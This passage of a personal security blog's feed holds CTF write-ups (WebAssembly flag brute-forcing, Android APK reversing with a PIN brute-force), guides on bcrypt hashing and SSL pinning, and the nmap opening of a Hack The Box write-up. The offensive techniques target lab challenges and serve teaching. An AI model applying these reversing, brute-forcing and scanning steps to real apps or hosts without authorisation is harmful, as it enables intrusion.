}</code></pre><p>Finally, the <code>Uint8Array</code> constructor is called with <code>morph</code> as the second parameter. We don't really know what <code>morph</code> does but it seems that the <code>inBuf</code> bytes are being transformed (somehow) and written to the <code>outBuf</code> array.</p><pre><code class="language-javascript">var morph = m.exports.morph(strBuf.length);	
var outBuf = new Uint8Array(m.exports.memory.buffer, morph, strBuf.length);</code></pre><h3 id="3-string-comparison">3. String comparison</h3><p>Finally the bytes in the <code>outBuf</code> are decoded back into ASCII, then encoded using Base64, and then compared with the hardcoded base64 key: if they're equal, success!</p><pre><code class="language-jsx">btoa(new TextDecoder().decode(outBuf)) === "dxB9BH8RVRMKG1NPI3UyOFRIJyJObAZdXkF8DUEJ"
</code></pre><h2 id="1-finding-the-uint8array-that-matches-the-flag">1. Finding the Uint8Array that matches the flag</h2><p>We start by reversing the last step in order to get the <code>outBuf</code> that when encoded matches the hardcoded key:</p><pre><code class="language-javascript">var key = "dxB9BH8RVRMKG1NPI3UyOFRIJyJObAZdXkF8DUEJ"
var base64decoded = atob(key)
var textEncoded = new TextEncoder().encode(base64decoded)
console.log(textEncoded)
// Uint8Array(30) [119, 16, 125, 4, 127, 17, 85, 19, 10, 27, 83, 79, 35, 117, 50, 56, 84, 72, 39, 34, 78, 108, 6, 93, 94, 65, 124, 13, 65, 9]
</code></pre><h2 id="2-brute-forcing-for-the-solution">2. Brute-forcing for the Solution</h2><p>In order to get the flag, we're going to brute-force the solution by comparing the  <code>outBuf</code> that results from each char with the successful buffer found in the previous step, byte by byte.</p><pre><code class="language-javascript">var bin = new Uint8Array([0,97,115,109,1,0,0,0,1,...]);
var m = new WebAssembly.Instance(new WebAssembly.Module(bin));
var offset = m.exports.getInStrOffset();

var successOutBuf = [119, 16, 125, 4, 127, 17, 85, 19, 10, 27, 83, 79, 35, 117, 50, 56, 84, 72, 39, 34, 78, 108, 6, 93, 94, 65,  124, 13, 65, 9];

var alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\"#$%&amp;\\'()*+,-./:;&lt;=&gt;?@[\\\\]^_`{|}~";

var match = function(flag, pos) {
	console.log("Test flag: " + flag)
	var strBuf = new TextEncoder().encode(flag.slice(0, 64));
	var inBuf = new Uint8Array(m.exports.memory.buffer, offset, strBuf.length);
  for (var i = 0; i &lt; strBuf.length; i++) {
		inBuf[i] = strBuf[i];
  }
  var morph = m.exports.morph(strBuf.length);	
  var outBuf = new Uint8Array(m.exports.memory.buffer, morph, strBuf.length);
  console.log("Comparing " + outBuf[pos] + " with " + successOutBuf[pos])
  if (outBuf[pos] == successOutBuf[pos]) {
	  return true;
  }
  return false;
}
  

var pos = 0;
var flag = "";
var letter = 0;
var foundPos = false;

while (pos &lt; 30) {
	foundPos = false
  for (var letter = 0; letter &lt; alphabet.length; letter++) {
	  if (!foundPos) {
	    var tmpLetter = alphabet[letter];
      var testFlag = flag + tmpLetter;
      var foundPos = match(testFlag, pos);
      if (foundPos) {
	      flag += tmpLetter;
        console.log("Found match! Updated flag: " + flag);
        pos++;
      }
    }
  }
  if (!foundPos) {
    alert("Didn't find match!")
  }
}
</code></pre><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/res.png" class="kg-image" alt="Web Assembly CTF Write-up"></figure><p>Hope you enjoyed it :)</p>]]></content:encoded></item><item><title><![CDATA[How to hash, store and validate a
password]]></title><description><![CDATA[<p><em>Banner source: </em><a href="https://blog.emsisoft.com/en/29524/how-to-create-manage-store-passwords/">https://blog.emsisoft.com/en/29524/how-to-create-manage-store-passwords/</a></p><blockquote>Rule #1: Never ever invent your own crypto algorithm.</blockquote><h2 id="what-makes-a-good-hashing-algorithm">What makes a good hashing algorithm?</h2><p>A good algorithm for hashing passwords:</p><ul><li>Is <strong>deterministic</strong>: the same plaintext will always produce the same hash;</li><li>Produces a completely different result if a <strong>single bit</strong></li></ul>]]></description><link>https://inesmartins.github.io//how-to-hash-and-store-a-password/</link><guid isPermaLink="false">5eedead61e7da103a083df3a</guid><category><![CDATA[authentication]]></category><category><![CDATA[hashing]]></category><category><![CDATA[algorithms]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 20 Jun 2020 11:01:07 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/07/create-and-store-passwords-securely-blog.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/07/create-and-store-passwords-securely-blog.png" alt="How to hash, store and validate a
password"><p><em>Banner source: </em><a href="https://blog.emsisoft.com/en/29524/how-to-create-manage-store-passwords/">https://blog.emsisoft.com/en/29524/how-to-create-manage-store-passwords/</a></p><blockquote>Rule #1: Never ever invent your own crypto algorithm.</blockquote><h2 id="what-makes-a-good-hashing-algorithm">What makes a good hashing algorithm?</h2><p>A good algorithm for hashing passwords:</p><ul><li>Is <strong>deterministic</strong>: the same plaintext will always produce the same hash;</li><li>Produces a completely different result if a <strong>single bit</strong> of the plaintext is<br>changed;</li><li>Is resistant to <strong>collision attacks</strong>. Two different plaintexts can sometimes produce the same hash, however, if the method to create this same hash is known, the algorithm shouldn't be used;</li><li>Is resistant to <a href="https://en.wikipedia.org/wiki/Rainbow_table">Rainbow Table</a> attacks by <strong>using salts</strong>;</li><li>Is compatible with performance requirements: always <strong>check benchmarks</strong>;</li><li>Allows parallelism in order to <strong>prevent the server from becoming<br>unresponsive</strong> during hashing;</li><li>Doesn't have other known vulnerabilities: Google is your friend.</li></ul><h2 id="tl-dr-use-bcrypt">tl;dr use Bcrypt</h2><p>Coda Hale's <a href="https://codahale.com/how-to-safely-store-a-password/">How To Safely Store A Password</a> provides an excellent explanation as to why <a href="https://en.wikipedia.org/wiki/Bcrypt">Bcrypt</a> is currently preferred to all the other popular hashing algorithms.</p><p>Also, this is the hashing algorithm <a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">recommended by OWASP</a>:</p><blockquote>Use Bcrypt unless you have a good reason not to.</blockquote><p>If you really can't use Bcrypt:</p><ul><li>remember to always add a salt to your hash in order to prevent <a href="https://en.wikipedia.org/wiki/Rainbow_table">rainbow-table attacks</a> (you can even add a <a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#peppering">pepper</a>);</li><li>make sure you're using an appropriate number of hashing rounds.</li></ul><h2 id="nodejs-example">NodeJS Example</h2><p>If you're developing a NodeJS application, <a href="https://www.npmjs.com/package/bcrypt">the bcrypt package</a> is a great library to:</p><ul><li>hash the plaintext passwords you receive from the front-end during the user registration process;</li><li>compare the plaintext passwords entered by the user during login with the hash previously stored in the DB.</li></ul><p>Note: make sure you're using at least 12 rounds.</p><pre><code class="language-javascript">import bcrypt from 'bcrypt'

const password = 'myv3rys3cr3tp@ssw0rd'
const rounds = 12

bcrypt.hash(password, rounds, (err, hash) =&gt; {
    if (err) {
    	console.error(err)
    	return
    }
    console.log(hash)
})

bcrypt.compare(password, hash, (err, res) =&gt; {
    if (err) {
        console.error(err)
        return
    }
    console.log(res) //true or false
})</code></pre><h2 id="resources">Resources</h2><ul><li>NIST's <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r4.pdf">Recommendation for Key Management</a></li><li>OWASP's <a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">Password Storage Cheat Sheet</a></li><li>OWASP's <a href="https://owasp.org/www-pdf-archive/Secure_Password_Storage_@OWASPChicago.pdf">Secure Password Storage</a></li><li><a href="https://medium.com/@rauljordan/the-state-of-hashing-algorithms-the-why-the-how-and-the-future-b21d5c0440de">The State of Hashing Algorithms</a></li><li><a href="https://codahale.com/how-to-safely-store-a-password/">How to Safely Store a Password</a></li></ul>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev]]></title><description><![CDATA[<p><em>The APK for the original challenge can be downloaded <a href="http://sefod.eu/ctf/xmas_ctfzadas.apk">here</a>.</em><br><em>The author's write-up can be downloaded <a href="https://www.dropbox.com/s/nh5thnkf8igarb9/%5B0x78%5D_0xOPOSEC_CHALLENGE_ANDROID_WEBVIEW_BOF.pdf?dl=1">here</a>.</em></p><p>We're given an Android Package (<code>xmas_ctfzadas.apk</code>) along with the following instructions:</p><!--kg-card-begin: markdown--><pre><code>Baby pwn tu-tu-tu-tu!
- Get the first two flags ({oposec}XPTO) locally;
- For the brave ones, find a way</code></pre>]]></description><link>https://inesmartins.github.io//oposec-baby-xmas-challenge-android-rev/</link><guid isPermaLink="false">5ee51aa03d00be7291b53f47</guid><category><![CDATA[android]]></category><category><![CDATA[rev]]></category><category><![CDATA[oposec]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 13 Jun 2020 21:33:38 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/highres_471963990-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/highres_471963990-1-1.jpeg" alt="ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev"><p><em>The APK for the original challenge can be downloaded <a href="http://sefod.eu/ctf/xmas_ctfzadas.apk">here</a>.</em><br><em>The author's write-up can be downloaded <a href="https://www.dropbox.com/s/nh5thnkf8igarb9/%5B0x78%5D_0xOPOSEC_CHALLENGE_ANDROID_WEBVIEW_BOF.pdf?dl=1">here</a>.</em></p><p>We're given an Android Package (<code>xmas_ctfzadas.apk</code>) along with the following instructions:</p><!--kg-card-begin: markdown--><pre><code>Baby pwn tu-tu-tu-tu!
- Get the first two flags ({oposec}XPTO) locally;
- For the brave ones, find a way to get the third flag
- Yup &quot;This_is_the_flag&quot; is your friend but not the final solution.
</code></pre>
<!--kg-card-end: markdown--><h2 id="unzipping-the-apk">Unzipping the APK</h2><p>An APK is actually just a ZIP file, by unzipping it we get to see the compressed files:</p><!--kg-card-begin: markdown--><pre><code>~ unzip app.apk

~ ls -la
...
-rw-r--r--@  1 inesmartins  staff     2444 Nov 22  2019 AndroidManifest.xml
drwxr-xr-x@  5 inesmartins  staff      160 Jun 13 20:59 META-INF
-rw-r--r--@  1 inesmartins  staff   178784 Nov 22  2019 classes.dex
-rw-r--r--@  1 inesmartins  staff  2062612 Nov 22  2019 classes2.dex
drwxr-xr-x@  3 inesmartins  staff       96 Jun 13 20:59 lib
drwxr-xr-x@ 16 inesmartins  staff      512 Jun 13 20:59 res
-rw-r--r--@  1 inesmartins  staff   225072 Nov 22  2019 resources.arsc
</code></pre>
<!--kg-card-end: markdown--><p>So, as expected we see <code>AndroidManifest.xml</code>, some .dex files (the source code), the resources, and also one <a href="https://en.wikipedia.org/wiki/Java_Native_Interface">Java Native Interface</a> (JNI) library that contains some interesting information:</p><!--kg-card-begin: markdown--><pre><code>~ strings lib/armeabi-v7a/libopoctf-jni.so

...
Java_pt_oposec_ctfzadas_CTFObject_firstFlag
Java_pt_oposec_ctfzadas_CTFObject_secondFlag
Java_pt_oposec_ctfzadas_CTFObject_thirdFlag
Java_pt_oposec_ctfzadas_MainActivity_stringFromJNI
envzadas
jump_here
jump_not_here
...
tres_out
...
This_is_not_the_flag
This_is_the_flag
...
</code></pre>
<!--kg-card-end: markdown--><h2 id="decoding-the-app">Decoding the app</h2><p><a href="https://ibotpeaches.github.io/Apktool/">apktool</a> is able to rebuild some of the resources of the Android project back to their original format, which is very useful when trying to read the <code>AndroidManifest.xml</code> file:</p><!--kg-card-begin: markdown--><pre><code>~ apktool decode xmas_ctfzadas.apk

~ cat xmas_ctfzadas/AndroidManifest.xml

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;
&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
          android:compileSdkVersion=&quot;23&quot;
          android:compileSdkVersionCodename=&quot;6.0-2438415&quot;
          package=&quot;pt.oposec.ctfzadas&quot;
          platformBuildVersionCode=&quot;1&quot;
          platformBuildVersionName=&quot;1.0&quot;&gt;
    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;
    &lt;application android:appComponentFactory=&quot;android.support.v4.app.CoreComponentFactory&quot;
                 android:allowBackup=&quot;true&quot;
                 android:debuggable=&quot;true&quot;
                 android:exported=&quot;true&quot;
                 android:icon=&quot;@mipmap/ic_launcher&quot;
                 android:label=&quot;@string/app_name&quot;
                 android:supportsRtl=&quot;true&quot;
                 android:theme=&quot;@style/AppTheme&quot;&gt;
        &lt;activity android:name=&quot;pt.oposec.ctfzadas.MainActivity&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;
                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
    &lt;/application&gt;
&lt;/manifest&gt;
</code></pre>
<!--kg-card-end: markdown--><p>As you can see, this application has only one <a href="https://developer.android.com/reference/android/app/Activity">Activity</a> - MainActivity.</p><h2 id="static-analysis-with-jd-gui">Static analysis with JD-GUI</h2><p>We start by transforming the .dex files into a single .jar file using the <a href="https://sourceforge.net/projects/dex2jar/files/">dex2jar</a> script:</p><!--kg-card-begin: markdown--><pre><code>~ sh dex2jar-2.0/d2j-dex2jar.sh -f xmas_ctfzadas.apk
</code></pre>
<!--kg-card-end: markdown--><p>To go through the .jar we use <a href="http://java-decompiler.github.io/">JD-GUI</a>.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/files-1.png" class="kg-image" alt="ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev"></figure><p>The <code>pt.oposec.ctfzadas</code> package contains 4 classes:</p><ul><li><code>BuildConfig.class</code> and <code>R.class</code> are both automatically generated files: the first lists the project configs and the second identifies all the project assets;</li><li>this leaves only 2 interesting files: <code>MainActivity.class</code> and <code>CTFObject.class</code>.</li></ul><h3 id="mainactivity-class">MainActivity.class</h3><p>As we can see below, on app start the MainActivity loads the <code>opoctf-jni</code> library, then creates a <a href="https://developer.android.com/reference/android/webkit/WebView">Webview</a> that has access to an instance of the <code>CTFObject</code> class called <code>ctfObj</code>. The webview's URL depends on the Intent's <code>open_sesame</code> query string.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/main-2.png" class="kg-image" alt="ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev"></figure><h3 id="ctfobject-class">CTFObject.class</h3><p>This class is quite interesting:</p><ol><li>There is a function called <code>um</code> that returns the output of the <code>firstFlag</code> JNI function:</li></ol><pre><code class="language-java">public class CTFObject {
...
	
    public native String firstFlag();
    
    @JavascriptInterface
    public String um() {
        return firstFlag();
    }

...
}
</code></pre><p>2. Similarly, there's a function called <code>dois</code> that calls the <code>secondFlag</code> JNI function with a string param. Note that there's a 5-number PIN mentioned on this function.</p><pre><code class="language-java">public class CTFObject {
...

    public native String secondFlag(String paramString);

    @JavascriptInterface
    public String dois(String paramString) {
        Log.d("OPOSEC", "Pin have 5 numbers (String)\nString starts with \"{oposec}\"");
        Log.d(secondFlag(paramString), secondFlag(paramString));
        return secondFlag(paramString);
    }

...
}
</code></pre><p>3. Finally, there's a <code>tres</code> function that calls the <code>thirdFlag</code> function from the JNI library with a byte array that's parsed from a hex string:</p><pre><code class="language-java">public class CTFObject {
...

    public static byte[] hexStringToByteArray(String paramString) {
        int j = paramString.length();
        byte[] arrayOfByte = new byte[j / 2 + 1];
        for (int i = 0; i &lt; j; i += 2)
            arrayOfByte[i / 2] = (byte)((Character.digit(paramString.charAt(i), 16) &lt;&lt; 4) + Character.digit(paramString.charAt(i + 1), 16));
            arrayOfByte[arrayOfByte.length - 1] = Integer.valueOf(0).byteValue();
        return arrayOfByte;
    }
  
    public native String thirdFlag(byte[] paramArrayOfbyte);
    
    @JavascriptInterface
    public String tres(String paramString) {
        Log.d("aaa-", paramString);
        byte[] arrayOfByte = hexStringToByteArray(paramString);
        Log.d("aaa:", String.valueOf(arrayOfByte));
        return thirdFlag(arrayOfByte);
    }

...
}
</code></pre><p>Note that functions <code>um</code>, <code>dois</code> and <code>tres</code> are accessible on the MainActivity's webview since they're marked with the <a href="https://developer.android.com/reference/android/webkit/JavascriptInterface">JavascriptInterface notation</a>.</p><h2 id="re-creating-the-android-project">Re-Creating the Android project</h2><p>After installing <a href="https://developer.android.com/studio/?gclid=CjwKCAjw8pH3BRAXEiwA1pvMsX1EY3uC8enHJFsoQM2iuA4gUypWFvBJ7tUuhjy1dcuRjtUnVzUa3RoCvdcQAvD_BwE&amp;gclsrc=aw.ds">Android Studio</a> we create a new Android project and then:</p><ul><li>add the <code>CTFObject</code> class to <code>src/main/java/pt.oposec.ctfzadas</code> - I ended up changing the Java code to Kotlin, since I'm more familiar with it.</li><li>add the <code>libopoctf-jni.so</code> library under <code>/src/main/jniLibs/armeabi-v7a</code> (this path is extremely important).</li></ul><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/dir.png" class="kg-image" alt="ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev"></figure><h2 id="getting-the-first-flag">Getting the first flag</h2><p>The first flag is very simple, all we need is an instance of <code>CTFObject</code> and then we can simply print the result of calling either <code>um</code> or the <code>firstFlag</code> function directly, as shown below.</p><pre><code class="language-kotlin">package pt.oposec.ctfzadas

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private var ctfObject = CTFObject()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        print(ctfObject.firstFlag())
    }
}
</code></pre><h2 id="getting-the-second-flag">Getting the second flag</h2><p>From the <code>CTFObject</code> class we know we need to find a 5-digit PIN code, which we can easily brute force. Knowing that the flag has the word <code>oposec</code> we simply run through all the options until we get the one that prints out the flag:</p><pre><code class="language-kotlin">package pt.oposec.ctfzadas

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    
    private var ctfObject = CTFObject()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        for (i in 0..9) {
            for (j in 0..9) {
                for (k in 0..9) {
                    for (l in 0..9) {
                        for (m in 0..9) {
                            val pin = "$i$j$k$l$m"
                            val res = ctfObject.secondFlag(pin)
                            if (res.contains("oposec")) {
                                print("Pin is: " + pin)
                                print("Flag is: " + res)
                            }
                        }
                    }
                }
            }
        }
        print("Could not get flag")   
    }
    ```</code></pre><h2 id="useful-resources">Useful Resources</h2><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://stackoverflow.com/questions/24357687/how-to-include-so-library-in-android-studio"><div class="kg-bookmark-content"><div class="kg-bookmark-title">How to include *.so library in Android Studio?</div><div class="kg-bookmark-description">I read many threads how to add a *.so library to Android Studio, but none of them works, especially when it comes to the point of text: This does not work with the newer xxx (Android Studio, gradle...</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon.png?v=c78bd457575a" alt="ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev"><span class="kg-bookmark-author">Ronald Wiplinger</span><span class="kg-bookmark-publisher">Stack Overflow</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon@2.png?v=73d79a89bded" alt="ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev"></div></a></figure>]]></content:encoded></item><item><title><![CDATA[Simplest way to host your Ghost blog on GitHub Pages]]></title><description><![CDATA[<p>This tutorial assumes you already have a Ghost blog that you want to host on Github Pages. </p><ol><li>Follow <a href="https://pages.github.com/">these instructions</a> to create a repository for your Github Pages blog, and then clone the repo somewhere on your computer;</li><li>Go to the directory where you have your Ghost blog, run <code>ghost</code></li></ol>]]></description><link>https://inesmartins.github.io//simplest-way-to-host-your-ghost-site-on-gitpages/</link><guid isPermaLink="false">5ede3138b6ef324dc7275d08</guid><category><![CDATA[ghost]]></category><category><![CDATA[blog]]></category><category><![CDATA[static site generator]]></category><category><![CDATA[gssg]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Mon, 08 Jun 2020 12:54:15 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/ghost-uma-otima-alternativa-para-blogs-profissionais-e-pessoais.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/ghost-uma-otima-alternativa-para-blogs-profissionais-e-pessoais.jpg" alt="Simplest way to host your Ghost blog on GitHub Pages"><p>This tutorial assumes you already have a Ghost blog that you want to host on Github Pages. </p><ol><li>Follow <a href="https://pages.github.com/">these instructions</a> to create a repository for your Github Pages blog, and then clone the repo somewhere on your computer;</li><li>Go to the directory where you have your Ghost blog, run <code>ghost start</code> and take note of the local port;</li><li>Install <a href="https://www.npmjs.com/package/ghost-static-site-generator">ghost-static-site-generator</a>;</li><li>If your blog is running on the default port (2368), you can simply run from your Ghost blog's directory:</li></ol><pre><code>gssg --url [your-github-pages-URL]</code></pre><p>if you're running from some other port you can specify it with the <code>domain</code> parameter:</p><pre><code>gssg --url [your-github-pages-URL] --domain http://localhost:4444 </code></pre><p>5. If everything went smoothly you now have a directory called static inside your Ghost blog's directory. You can check if everything went well by running:</p><pre><code>gssg preview</code></pre><p>6. Copy all of the contents of the static dir to the Github Pages repo, commit + push these new files and you're done!</p><p>Note that instead of copying the files, you can set the Github Pages repo as the destination directory as such:</p><pre><code>gssg --url [your-github-pages-URL] --dest your-github-pages-repo</code></pre>]]></content:encoded></item><item><title><![CDATA[SSL Pinning on Android]]></title><description><![CDATA[<p><em>Banner source: <a href="https://dzone.com/refcardz/securing-mobile-applications-with-cert-pinning?chapter=1">https://dzone.com/refcardz/securing-mobile-applications-with-cert-pinning?chapter=1</a></em></p><p>Typically, when an Android application wants to establish a trusted connection with a remote host, it checks whether the certificate's "chain of trust" is valid and compatible with the root CAs (Certificate Authorities) that are pre-installed in the device (Settings &gt;</p>]]></description><link>https://inesmartins.github.io//ssl-pinning-on-android/</link><guid isPermaLink="false">5ede2cbdb6ef324dc7275cc2</guid><category><![CDATA[ssl]]></category><category><![CDATA[android]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Mon, 08 Jun 2020 12:26:32 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/mitm.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/mitm.png" alt="SSL Pinning on Android"><p><em>Banner source: <a href="https://dzone.com/refcardz/securing-mobile-applications-with-cert-pinning?chapter=1">https://dzone.com/refcardz/securing-mobile-applications-with-cert-pinning?chapter=1</a></em></p><p>Typically, when an Android application wants to establish a trusted connection with a remote host, it checks whether the certificate's "chain of trust" is valid and compatible with the root CAs (Certificate Authorities) that are pre-installed in the device (Settings &gt; Security &gt; Trusted Credentials). </p><p>However, this hierarchy can and <em>is</em> sometimes compromised, i.e.: malicious actors are sometimes able to generate fake certificates, which allow them to intercept encrypted communications.</p><p>SSL Pinning is a mechanism that ensures that one or more public keys or certificates that the client knows to be trustworthy are part of the chain of the host's certificate.</p><h3 id="can-ssl-pinning-be-circumvented">Can SSL Pinning be circumvented?</h3><p>Yes, <u>if the Android device is rooted</u>. See:</p><ul><li><a href="https://medium.com/@felipecsl/bypassing-certificate-pinning-on-android-for-fun-and-profit-1b0d14beab2b">Bypassing Certificate Pinning on Android for fun and profit</a></li><li><a href=" https://spenkk.github.io/bugbounty/Configuring-Frida-with-Burp-and-GenyMotion-to-bypass-SSL-Pinning/">Configuring Frida with BurpSuite and Genymotion to bypass Android SSL Pinning</a></li></ul><h3 id="certificate-pinning-vs-key-pinning">Certificate Pinning vs Key Pinning</h3><p>It's possible to pin multiple certificates from the host's certificate's chain. The application will establish the connection with the server as long as at least one of them is valid. However:</p><ul><li>Pinning only the "leaf" certificates means the application will stop working every time the server updates its certificates, unless backup certificates are configured, which is recommended. This may or may not be a problem, depending on how often these certificates are updated (typically this update occurs every 1 or 2 years).</li><li>Pinning intermediate certificates means trusting that the intermediate CAs won't generate malicious certificates for the server. However, if the "leaves" change, the app will continue to work.</li></ul><p>One very simple way to prevent the app from having to be updated every time its "leaves" are updated, is to <u>pin the certificate's public key</u> instead of the certificates themselves.</p><p>Unless the CA requires a new certificate request, updating a certificate doesn't change its public key and, as such, it's possible to use this key for a lot longer. </p><p>This solution also prevents the application from trusting any 3rd party, such as intermediate CAs.</p><h3 id="public-key-pinning-using-okhttp">Public Key Pinning using OkHttp</h3><p><a href="https://square.github.io/okhttp/">OkHttp</a> is one of the most commonly used libraries to manage network requests in Android. Parameterising this library to use SSL pining, and more specifically, public key pinning is very simple:</p><ol><li>Build an instance of <a href="https://square.github.io/okhttp/3.x/okhttp/okhttp3/CertificatePinner.html">CertificatePinner</a> that contains all the public keys and corresponding hostnames you want to pin: </li></ol><pre><code class="language-kotlin">val pinner = CertificatePinner
	.Builder()
    .add(CERT_HOSTNAME_1, CERT_PUBLIC_KEY_1)
    .add(CERT_HOSTNAME_2, CERT_PUBLIC_KEY_2)
    .add(CERT_HOSTNAME_N, CERT_PUBLIC_KEY_N)
	.build()</code></pre><p>2. Pass this object as a param of the <a href="https://square.github.io/okhttp/3.x/okhttp/okhttp3/OkHttpClient.Builder.html">OkHttpClient builder</a>:</p><pre><code class="language-kotlin">val okhttpClient = OkHttpClient
	.Builder()
    .certificatePinner(pinner)
    .build()</code></pre><h3 id="sources"><strong>Sources</strong></h3><ul><li><a href="https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning">https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning</a></li><li><a href="https://medium.com/@appmattus/android-security-ssl-pinning-1db8acb6621e">https://medium.com/@appmattus/android-security-ssl-pinning-1db8acb6621e</a></li><li><a href="https://dzone.com/refcardz/securing-mobile-applications-with-cert-pinning?chapter=1">https://dzone.com/refcardz/securing-mobile-applications-with-cert-pinning?chapter=1</a></li><li><a href="https://www.netguru.com/codestories/3-ways-how-to-implement-certificate-pinning-on-android">https://www.netguru.com/codestories/3-ways-how-to-implement-certificate-pinning-on-android</a></li><li><a href="https://www.raywenderlich.com/5634-securing-network-data-tutorial-for-android">https://www.raywenderlich.com/5634-securing-network-data-tutorial-for-android</a></li><li><a href="https://medium.com/@enriqueramrezmanzaneda/managing-api-keys-in-android-builds-ddf56bb3b5a5">https://medium.com/@enriqueramrezmanzaneda/managing-api-keys-in-android-builds-ddf56bb3b5a5</a></li></ul>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Resolute]]></title><description><![CDATA[<p><em>The retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/220">here</a>.<br>Official write-up can be downloaded <a href="https://www.hackthebox.eu/home/machines/writeup/220">here</a>.</em></p><p>I started with some basic scanning with nmap that found that most likely this machine was a Domain Controller, since it had all the <a href="http://techgenix.com/domain-controllers-required-ports/">required ports</a> open. </p><!--kg-card-begin: markdown--><pre><code>$ nmap -sC -sV 10.10.10.169 -Pn

53/tcp</code></pre>]]></description><link>https://inesmartins.github.io//htb-walkthrough-resolute-user/</link><guid isPermaLink="false">5ede1edc75d86d3b22fddbe0</guid><category><![CDATA[windows]]></category><category><![CDATA[htb]]></category><category><![CDATA[ad]]></category><category><![CDATA[windapsearch]]></category><category><![CDATA[domain controller]]></category><category><![CDATA[windows domain]]></category><category><![CDATA[evil-winrm]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Mon, 08 Jun 2020 11:58:35 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/resolute.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/resolute.png" alt="HTB Write-up | Resolute"><p><em>The retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/220">here</a>.<br>Official write-up can be downloaded <a href="https://www.hackthebox.eu/home/machines/writeup/220">here</a>.</em></p><p>I started with some basic scanning with nmap that found that most likely this machine was a Domain Controller, since it had all the <a href="http://techgenix.com/domain-controllers-required-ports/">required ports</a> open. </p><!--kg-card-begin: markdown--><pre><code>$ nmap -sC -sV 10.10.10.169 -Pn

53/tcp open domain?
| fingerprint-strings:
    | DNSVersionBindReqTCP:
        | version
        |_ bind
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2019-12-21 22:13:06Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open tcpwrapped
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open mc-nmf .NET Message Framing
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open msrpc Microsoft Windows RPC
49665/tcp open msrpc Microsoft Windows RPC
49666/tcp open msrpc Microsoft Windows RPC
49667/tcp open msrpc Microsoft Windows RPC
49671/tcp open msrpc Microsoft Windows RPC
49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
49677/tcp open msrpc Microsoft Windows RPC
49688/tcp open msrpc Microsoft Windows RPC
